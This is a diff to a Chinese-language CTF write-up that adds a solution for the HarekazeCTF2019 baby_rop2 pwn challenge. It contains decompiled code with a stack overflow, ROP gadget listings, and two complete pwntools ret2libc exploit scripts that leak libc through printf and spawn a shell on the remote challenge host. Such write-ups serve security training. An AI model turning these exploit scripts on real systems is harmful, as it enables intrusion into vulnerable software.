@@ -391,7 +391,7 @@ io.interactive()
 
 ### [[HarekazeCTF2019]baby_rop](https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop)
 
-先`file ./HarekazeCTF2019_babyrop1`查看文件类型再`checksec --file=./HarekazeCTF2019_babyrop1`检查了一下文件保护情况。
+先`file ./HarekazeCTF2019_babyrop1`查看文件类型再`checksec --file=./HarekazeCTF2019_babyrop1`检查文件保护情况。
 
 ![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/1.png) 
 
@@ -439,6 +439,141 @@ io.interactive()  # cat /home/babyrop flag
 ```
 
 ![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/6.png)
+
+------
+
+### [HarekazeCTF2019]baby_rop2
+
+先`file ./HarekazeCTF2019_babyrop2`查看文件类型，再`checksec --file=./HarekazeCTF2019_babyrop2`检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ file ./HarekazeCTF2019_babyrop2
+./HarekazeCTF2019_babyrop2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=fab931b976ae2ff40aa1f5d1926518a0a31a8fd7, not stripped
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ checksec --file=./HarekazeCTF2019_babyrop2
+[*] '/home/tyd/ctf/pwn/buuctf/HarekazeCTF2019_babyrop2'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+用`IDA Pro 64bit`打开附件`HarekazeCTF2019_babyrop2`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf[28]; // [rsp+0h] [rbp-20h] BYREF
+  int v5; // [rsp+1Ch] [rbp-4h]
+
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  printf("What's your name? ");
+  v5 = read(0, buf, 0x100uLL);
+  buf[v5 - 1] = 0;
+  printf("Welcome to the Pwn World again, %s!\n", buf);
+  return 0;
+}
+```
+
+这题和[**[HarekazeCTF2019]baby_rop**](#[HarekazeCTF2019]baby_rop)的区别就在于，程序中没有现成的`system`和`/bin/sh`可以利用。我们需要利用`printf`函数来计算出`libc`的基地址，以便求出`system`和`/bin/sh`。在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`的地址。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ ROPgadget --binary ./HarekazeCTF2019_babyrop2 --only "pop|ret"
+Gadgets information
+============================================================
+0x000000000040072c : pop r12 ; pop r13 ; pp r14 ; pop r15 ; ret
+0x000000000040072e : pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400730 : pop r14 ; pop r15 ; ret
+0x0000000000400732 : pop r15 ; ret
+0x000000000040072b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040072f : pop rbp ; pop r14 ; pop r15 ; ret
+0x00000000004005a0 : pop rbp ; ret
+0x0000000000400733 : pop rdi ; ret
+0x0000000000400731 : pop rsi ; pop r15 ; ret
+0x000000000040072d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004004d1 : ret
+0x0000000000400532 : ret 0x200a
+
+Unique gadgets found: 12
+```
+
+编写`Python`代码求解，`cat /home/babyrop2/flag`得到`flag{ca63fb55-fa76-4655-994d-6bca048f1748}`。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 27378)
+elf = ELF('./HarekazeCTF2019_babyrop2')
+main = elf.sym['main']
+printf_plt = elf.plt['printf']
+read_got = elf.got['read']
+rdi_ret = 0x400733 # pop rdi ; ret
+offset = 0x20 + 0x8
+payload = b'a'*offset + flat(rdi_ret, read_got, printf_plt, main)
+io.sendlineafter(b"What's your name? ", payload)
+read_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
+log.info('read_address => %s', hex(read_addr))
+libc = ELF('./libc.so.6')
+libcbase = read_addr-libc.sym['read']
+log.info('libc_address => %s', hex(libcbase))
+system = libcbase + libc.sym['system']
+log.info('system_address => %s', hex(system))
+bin_sh = libcbase + libc.search(b'/bin/sh').__next__()
+log.info('bin_sh_address => %s', hex(bin_sh))
+payload = b'a'*offset + p64(rdi_ret) + p64(bin_sh) + p64(system)
+io.sendlineafter(b"What's your name? ", payload)
+io.interactive() # cat /home/babyrop2/flag
+```
+
+看`Write Up`的时候发现有些师傅利用格式化字符串，构造出`printf("%s", read_got)`泄露`read`函数的`got`表地址。`%s`的地址为`0x400770`。`p64(rdi_ret)+p64(format_str)`将`b'a'*offset`造成栈溢出后的返回地址覆盖为`pop_rdi; ret`，`pop_rdi`对应参数为`format_str`，执行后将`format_str`赋值给`rdi`，之后执行`ret`返回指令。`p64(pop_rsi)+p64(read_got)+p64(0)`是上个`ret`要执行的，将`rsi`寄存器的值设置成`read`函数的`got`表地址，用不着`r15`就设置为`0`。`pop_rsi`的`ret`返回到`p64(printf_plt)`，利用`printf`函数输出`read`函数的`got`表地址。在获得`read`函数的`got`表地址后，我们需要用`p64(main)`回到程序开头。
+
+```assembly
+.rodata:0000000000400758 ; const char format[]
+.rodata:0000000000400758 format          db 'What',27h,'s your name? ',0
+.rodata:0000000000400758                                         ; DATA XREF: main+44↑o
+.rodata:000000000040076B                 align 10h
+.rodata:0000000000400770 ; const char aWelcomeToThePw[]
+.rodata:0000000000400770 aWelcomeToThePw db 'Welcome to the Pwn World again, %s!',0Ah,0
+.rodata:0000000000400770                                         ; DATA XREF: main+80↑o
+.rodata:0000000000400770 _rodata         ends
+```
+
+编写`Python`代码求解，`cat /home/babyrop2/flag`得到`flag{ca63fb55-fa76-4655-994d-6bca048f1748}`。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 27378)
+elf = ELF('./HarekazeCTF2019_babyrop2')
+main = elf.sym['main']
+printf_plt = elf.plt['printf']
+read_got = elf.got['read']
+rdi_ret = 0x400733 # pop rdi ; ret
+pop_rsi = 0x400731 # pop rsi ; pop r15 ; ret
+format_str = 0x400770
+offset = 0x20 + 0x8
+payload = b'a'*offset + flat(rdi_ret, format_str, pop_rsi, read_got, 0, printf_plt, main)
+io.sendlineafter(b"What's your name? ", payload)
+read_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
+log.info('read_address => %s', hex(read_addr))
+libc = ELF('./libc.so.6')
+libcbase = read_addr-libc.sym['read']
+log.info('libc_address => %s', hex(libcbase))
+system = libcbase + libc.sym['system']
+log.info('system_address => %s', hex(system))
+bin_sh = libcbase + libc.search(b'/bin/sh').__next__()
+log.info('bin_sh_address => %s', hex(bin_sh))
+payload = b'a'*offset + p64(rdi_ret) + p64(bin_sh) + p64(system)
+io.sendlineafter(b"What's your name? ", payload)
+io.interactive() # cat /home/babyrop2/flag
+```
 
 ------
 
